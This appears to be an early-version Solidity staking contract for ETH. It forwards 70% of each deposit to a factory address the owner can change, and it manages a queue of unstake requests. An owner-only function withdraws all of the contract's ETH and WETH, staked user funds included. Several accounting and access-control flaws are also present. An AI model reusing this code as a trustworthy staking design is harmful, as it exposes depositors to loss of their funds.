// SPDX-License-Identifier: MIT
// VortexDapp Staking v0.1

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";


contract SimpleStaking is ReentrancyGuard {

    mapping(address => uint256) public stakes;
    mapping(address => uint256) public rewardDebt;
    mapping(address => uint256) public pendingUnstakes;
    address public factoryAddress;
    address public weth;
    address public owner;
    uint256 public totalStaked;
    uint256 public totalRewards;
    uint256 public accRewardPerShare;
    uint256 public lastRewardTime;
    uint256 public constant REWARD_INTERVAL = 7 days;

    event Stake(address indexed user, uint256 amount);
    event Unstake(address indexed user, uint256 amount);
    event RewardsAdded(uint256 amount);
    event RewardClaimed(address indexed user, uint256 amount);
    event UnstakeQueued(
        address indexed user,
        uint256 amount,
        uint256 timestamp
    );
    event UnstakeRequested(
        address indexed user,
        uint256 amount,
        uint256 pendingAmount
    );
    event UnstakeProcessed(
        address indexed user,
        uint256 amount,
        uint256 pendingAmount
    );
    event FundsReceived(uint256 amount, uint256 timestamp);

    struct UnstakeRequest {
        address user;
        uint256 amount;
        uint256 timestamp;
    }

    UnstakeRequest[] public unstakeQueue;

    constructor(address _weth, address factory) {
        owner = msg.sender;
        lastRewardTime = block.timestamp;
        weth = _weth;
        factoryAddress = factory;
    }

    // Function to stake eth on the platform
    function stake() external payable nonReentrant {
        require(msg.value > 0, "Cannot stake 0 ETH");
        updatePool();

        IWETH(weth).deposit{value: msg.value}();

        // Send 70% to the factory contract
        uint256 factoryShare = (msg.value * 70) / 100;

        require(
            IWETH(weth).transfer(factoryAddress, factoryShare),
            "Failed to send WETH to factory"
        );

        if (stakes[msg.sender] > 0) {
            uint256 pending = ((stakes[msg.sender] * accRewardPerShare) /
                1e12) - rewardDebt[msg.sender];
            if (pending > 0) {
                IWETH(weth).withdraw(pending);
                payable(msg.sender).transfer(pending);
                emit RewardClaimed(msg.sender, pending);
            }
        }

        stakes[msg.sender] += msg.value;
        totalStaked += msg.value;
        rewardDebt[msg.sender] = (stakes[msg.sender] * accRewardPerShare) / 1e12;

        emit Stake(msg.sender, msg.value);
    }

    // Unstaking when there are funds available in this contract
    function processImmediateUnstake(address user, uint256 amount) internal {
        IWETH(weth).withdraw(amount);
        payable(user).transfer(amount);
        stakes[user] -= amount;
        totalStaked -= amount;
        rewardDebt[user] = (stakes[user] * accRewardPerShare) / 1e12;

        emit Unstake(user, amount);
    }

    uint256 public totalFundsNeeded;

    function addToUnstakeQueue(address user, uint256 amount) internal {
        UnstakeRequest memory request = UnstakeRequest({
            user: user,
            amount: amount,
            timestamp: block.timestamp
        });
        unstakeQueue.push(request);
        emit UnstakeQueued(user, amount, block.timestamp);
        uint256 totalQueueAmount = getTotalUnstakeQueueAmount();

        notifyFactoryForFunds(totalQueueAmount);
    }

    event NotifyFactoryForFunds(uint256 amountNeeded);

    function notifyFactoryForFunds(uint256 amountNeeded) internal {
        emit NotifyFactoryForFunds(amountNeeded);
        IFundsInterface(factoryAddress).notifyFundsNeeded(amountNeeded);
    }

    // Process unstake request
    function requestUnstake(uint256 amount) public nonReentrant {
        require(stakes[msg.sender] >= amount, "Insufficient staked balance");

        uint256 wethBalance = IWETH(weth).balanceOf(address(this));

        if (wethBalance >= amount) {
            processImmediateUnstake(msg.sender, amount);
        } else {
            IFundsInterface(factoryAddress).provideFundsIfNeeded(
                address(this),
                amount
            );

            wethBalance = IWETH(weth).balanceOf(address(this));

            if (wethBalance >= amount) {
                processImmediateUnstake(msg.sender, amount);
            } else {
                pendingUnstakes[msg.sender] += amount;
                addToUnstakeQueue(msg.sender, amount);
            }
        }

        emit UnstakeRequested(msg.sender, amount, pendingUnstakes[msg.sender]);
    }

    // Get the staked amount of a user
    function getStake(address staker) external view returns (uint256) {
        return stakes[staker];
    }

    // Update reward pool
    function updatePool() internal {
        if (block.timestamp <= lastRewardTime) {
            return;
        }

        if (totalStaked == 0) {
            lastRewardTime = block.timestamp;
            return;
        }

        uint256 multiplier = block.timestamp - lastRewardTime;
        uint256 reward = (multiplier * totalRewards) / REWARD_INTERVAL;

        if (reward > 0) {
            accRewardPerShare += (reward * 1e12) / totalStaked;
        }

        lastRewardTime = block.timestamp;
    }

    // Function called by the factory to add rewards from the collect fees
    function addRewards() external payable {
        require(msg.value > 0, "No rewards to add");
        IWETH(weth).deposit{value: msg.value}();
        totalRewards += msg.value;
        updatePool();
        emit RewardsAdded(msg.value);
    }

    function pendingReward(address _user) external view returns (uint256) {
        uint256 _accRewardPerShare = accRewardPerShare;
        if (block.timestamp > lastRewardTime && totalStaked != 0) {
            uint256 multiplier = block.timestamp - lastRewardTime;
            uint256 reward = (multiplier * totalRewards) / REWARD_INTERVAL;
            _accRewardPerShare += (reward * 1e12) / totalStaked;
        }
        uint256 simulatedReward = ((stakes[_user] * _accRewardPerShare) / 1e12);
        return simulatedReward - rewardDebt[_user];
    }

    function getTotalStaked() public view returns (uint256) {
        return totalStaked;
    }

    // Process claiming rewards
    function claimRewards() external nonReentrant {
        updatePool();

        uint256 userStake = stakes[msg.sender];
        require(userStake > 0, "No staked amount to claim rewards for");

        uint256 accumulatedReward = (userStake * accRewardPerShare) / 1e12;
        uint256 pendingRewards = accumulatedReward - rewardDebt[msg.sender];

        require(pendingRewards > 0, "No rewards to claim");
        require(totalRewards >= pendingRewards, "Not enough rewards in pool");

        totalRewards -= pendingRewards;
        rewardDebt[msg.sender] = accumulatedReward;

        IWETH(weth).withdraw(pendingRewards);
        (bool sent, ) = payable(msg.sender).call{value: pendingRewards}("");
        require(sent, "Failed to send ETH");
        emit RewardClaimed(msg.sender, pendingRewards);
    }

    fallback() external payable {}

    receive() external payable {}
    

    // Function to withdraw all ETH and WETH to the owner's address
    function retrieveAllFunds() external onlyOwner {
        // Transfer all ETH from contract to owner
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            payable(owner).transfer(ethBalance);
        }

        // Retrieve all WETH balance, unwrap to ETH and send to owner
        IWETH wrappedeth = IWETH(weth);
        uint256 wethBalance = wrappedeth.balanceOf(address(this));
        if (wethBalance > 0) {
            // Unwrap WETH to ETH
            wrappedeth.withdraw(wethBalance);
            // Transfer unwrapped ETH to owner
            payable(owner).transfer(wethBalance);
        }

    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    function setFactoryAddress(address _factoryAddress) external onlyOwner {
        factoryAddress = _factoryAddress;
    }

    function notifyFundsReceived(uint256 amount) external {
        require(msg.sender == factoryAddress, "Only factory can notify");
        emit FundsReceived(amount, block.timestamp);
        handleReceivedWETHALLQUEUE();
    }

    event DebugAvailableWETH(uint256 availableWETH);
    event DebugProcessAttempt(address user, uint256 amountToProcess);
    event UnstakeRequestDetails(
        uint index,
        address user,
        uint256 amount,
        uint256 pendingUnstakes
    );
    event WETHProcessed(
        address user,
        uint256 processedAmount,
        uint256 remainingWETH
    );
    event ProcessUnstakeError(
        address user,
        uint256 requestedAmount,
        string error
    );
    event FailedToProcessUnstake(address user, uint256 amount);
    event FundsRequested(uint256 amount);

    function handleReceivedWETH() internal {
        uint256 availableWETH = IWETH(weth).balanceOf(address(this));
        emit DebugAvailableWETH(availableWETH);

        if (unstakeQueue.length > 0) {
            UnstakeRequest storage request = unstakeQueue[0];
            emit UnstakeRequestDetails(
                0,
                request.user,
                request.amount,
                request.timestamp
            );

            if (availableWETH >= request.amount) {
                processImmediateUnstake(request.user, request.amount);
                removeFromQueue(0);
                totalFundsNeeded -= ((request.amount * 70) / 100);

                availableWETH = IWETH(weth).balanceOf(address(this));
            } else {
                uint256 wethShortfall = request.amount - availableWETH;
                notifyFactoryForFunds(wethShortfall);
                emit FundsRequested(wethShortfall);
            }
        }
    }

    function handleReceivedWETHFromScript() external {
        uint256 availableWETH = IWETH(weth).balanceOf(address(this));
        emit DebugAvailableWETH(availableWETH);

        if (unstakeQueue.length > 0) {
            UnstakeRequest storage request = unstakeQueue[0];
            emit UnstakeRequestDetails(
                0,
                request.user,
                request.amount,
                request.timestamp
            );

            if (availableWETH >= request.amount) {
                processImmediateUnstake(request.user, request.amount);
                removeFromQueue(0);
            } else {
                uint256 wethShortfall = request.amount - availableWETH;
                notifyFactoryForFunds(wethShortfall);
                emit FundsRequested(wethShortfall);
            }
        }
    }

    function handleReceivedWETHALLQUEUE() internal {
        uint256 availableWETH = IWETH(weth).balanceOf(address(this));
        emit DebugAvailableWETH(availableWETH);

        uint256 fundsNeeded = 0;

        for (uint i = 0; i < unstakeQueue.length && availableWETH > 0; ) {
            UnstakeRequest storage request = unstakeQueue[i];

            if (availableWETH >= request.amount) {
                processImmediateUnstake(request.user, request.amount);
                availableWETH -= request.amount;

                unstakeQueue[i] = unstakeQueue[unstakeQueue.length - 1];
                unstakeQueue.pop();
            } else {
                fundsNeeded += request.amount - availableWETH;
                i++;
            }
        }

        if (fundsNeeded > 0) {
            notifyFactoryForFunds(fundsNeeded);
            emit FundsRequested(fundsNeeded);
        }
    }

    function removeFromQueue(uint index) internal {
        require(index < unstakeQueue.length, "Index out of bounds.");
        unstakeQueue[index] = unstakeQueue[unstakeQueue.length - 1];
        unstakeQueue.pop();
    }

    function canProcessUnstake(
        address user,
        uint256 amount
    ) internal view returns (bool) {
        return
            IWETH(weth).balanceOf(address(this)) >= amount &&
            pendingUnstakes[user] >= amount;
    }

    function getUnstakeQueueLength() public view returns (uint) {
        return unstakeQueue.length;
    }

    function getUnstakeRequest(
        uint index
    ) public view returns (address user, uint256 amount, uint256 timestamp) {
        require(index < unstakeQueue.length, "Index out of bounds");
        UnstakeRequest storage request = unstakeQueue[index];
        return (request.user, request.amount, request.timestamp);
    }

    function getTotalUnstakeQueueAmount()
        public
        view
        returns (uint256 totalAmount)
    {
        uint256 total = 0;
        for (uint i = 0; i < unstakeQueue.length; i++) {
            total += unstakeQueue[i].amount;
        }
        return total;
    }

    function getTotalRewards() external view returns (uint256) {
        return totalRewards;
    }
}

interface IWETH {
    function deposit() external payable;

    function deposit(uint256 amount) external payable;

    function withdraw(uint256 amount) external;

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
}

interface IFundsInterface {
    function notifyFundsNeeded(uint256 amount) external;

    function provideFundsIfNeeded(
        address stakingContract,
        uint256 amountRequested
    ) external;
}